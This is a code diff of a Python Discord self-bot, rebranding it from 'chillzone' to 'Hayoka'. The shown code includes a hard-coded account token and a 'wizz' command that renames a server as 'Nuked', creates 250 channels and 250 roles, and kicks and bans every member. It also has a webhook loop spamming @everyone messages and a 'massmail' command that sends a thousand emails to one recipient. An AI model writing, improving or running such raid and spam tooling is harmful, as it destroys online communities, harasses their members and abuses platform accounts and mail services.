@@ -19,11 +19,11 @@ from colored import fg, attr
 
 
 
-os.system('cls & mode 85,20 & title [Cyber Sec] - https://discord.gg/chillzone')
+os.system('cls & mode 85,20 & title [Hayoka] - https://discord.gg/chillzone')
 os.system('cls')
 
 token = "MTIxOTI3NDEwNjk4MjM2NzI0Mw.G4duIy.bi7dtTT4XVSs3w4mzMpiX8vpGO2xTps3ZASfCI"
-prefix = ">"
+prefix = ""
 
 client = commands.Bot(command_prefix=prefix, case_insensitive=True, self_bot=True)
 client.remove_command(name='help')
@@ -79,7 +79,7 @@ client.remove_command('help')
 
 @client.event
 async def on_ready():
-    await client.change_presence(activity=discord.Streaming(name="discord.gg/chillzone", url='https://discord.gg/c'))
+    await client.change_presence(activity=discord.Streaming(name="discord.gg/chillzone", url='https://twitch.tv/discord'))
 
     print(
         f"{colors.main}┏┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓{colors.main}"
@@ -496,30 +496,30 @@ async def wizz(ctx):
             pass
 
     try:
-        await ctx.guild.edit(name='chillzone', description='chillzone',
-          reason='chillzone',
+        await ctx.guild.edit(name='Owned by Hayoka', description='Nuked',
+          reason='Lame Server',
           icon=None,
           banner=None)
     except:
         pass
 
     for _i in range(250):
-        await ctx.guild.create_text_channel(name='chillzone')
+        await ctx.guild.create_text_channel(name='Nuked by hayoka')
 
     for _i in range(250):
-        await ctx.guild.create_role(name='chillzone')
+        await ctx.guild.create_role(name='Hayoka owns you')
 
     users = list(ctx.guild.members)
     for user in users:
         try:
-            await user.kick(reason='chillzone')
+            await user.kick(reason='Get a life')
         except:
             pass
 
     users = list(ctx.guild.members)
     for user in users:
         try:
-            await user.ban(reason='chillzone')
+            await user.ban(reason='Nuked by hayoka')
         except:
             pass
 
@@ -649,7 +649,7 @@ async def listen(ctx, *, message):
 
 def ssspam(webhook):
     while spammingdawebhookeroos:
-        data = {'content':'@everyone @here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here chillzone SE LOGE PANGA LO HO GAYA NANGA JOIN FAST https://discord.gg/chillzone  '}
+        data = {'content':'@everyone Nuked by hayoka'}
         spamming = requests.post(webhook, json=data)
         spammingerror = spamming.text
         if spamming.status_code == 204:
@@ -728,7 +728,7 @@ async def massmail(ctx, reciver):
     reciever = reciver
     sslcontext = ssl.create_default_context()
     for i in range(0, 1000):
-        message = '  chillzone HERE HHAHAHA '
+        message = 'Hayoka here '
         port = 465
         connection = smtplib.SMTP_SSL('smtp.gmail.com', port, context=sslcontext)
         connection.login(email, password)
@@ -752,20 +752,9 @@ async def code(ctx, *, message):
 @client.command()
 async def massreact(ctx, emote):
     await ctx.message.delete()
-    messages = await ctx.message.channel.history(limit=100).flatten()
+    messages = await ctx.message.channel.history(limit=20).flatten()
     for message in messages:
         await message.add_reaction(emote)
-
-
-
-    
-
-
-
-
-
-
-
 
 @client.command()
 async def leave(ctx, guild_id):
